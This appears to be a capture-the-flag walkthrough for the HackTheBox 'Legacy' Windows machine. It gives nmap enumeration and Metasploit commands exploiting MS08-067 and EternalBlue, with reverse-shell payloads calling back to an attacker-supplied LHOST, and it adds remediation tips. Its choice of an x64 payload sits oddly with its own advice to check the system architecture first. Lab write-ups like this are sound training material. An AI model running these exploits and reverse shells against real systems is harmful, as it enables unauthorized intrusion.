# Legacy - HackTheBox Walkthrough

## Machine Information
- **Name**: Legacy
- **Difficulty**: Easy
- **OS**: Windows
- **Date Completed**: May 2022

## Overview
Legacy is an easy Windows machine that demonstrates classic Windows vulnerabilities, particularly focusing on legacy services and protocols.

## Reconnaissance

### Nmap Scan
```bash
nmap -sC -sV -oN legacy.nmap 10.10.10.4
```

Initial scan reveals:
- Port 139/tcp - netbios-ssn
- Port 445/tcp - microsoft-ds

### Service Enumeration
```bash
nmap --script smb-vuln* 10.10.10.4
```

This reveals the machine is vulnerable to:
- MS08-067 (Conficker)
- MS17-010 (EternalBlue)

## Exploitation

### Method 1: MS08-067
Using Metasploit:
```bash
use exploit/windows/smb/ms08_067_netapi
set RHOSTS 10.10.10.4
set payload windows/shell_reverse_tcp
set LHOST your_ip
exploit
```

### Method 2: MS17-010 (EternalBlue)
```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.4
set payload windows/x64/shell_reverse_tcp
set LHOST your_ip
exploit
```

## Post-Exploitation

### System Information
```cmd
systeminfo
whoami
```

### Flag Collection
- **User Flag**: Located in `C:\Documents and Settings\john\Desktop\user.txt`
- **Root Flag**: Located in `C:\Documents and Settings\Administrator\Desktop\root.txt`

## Key Learning Points
1. Legacy Windows systems often have unpatched vulnerabilities
2. SMB services are frequent attack vectors
3. MS08-067 and MS17-010 are classic Windows exploits
4. Always verify system architecture before selecting payloads

## Remediation
- Apply security patches regularly
- Disable unnecessary services like SMBv1
- Implement network segmentation
- Use endpoint protection solutions

---
*This walkthrough is for educational purposes only.*
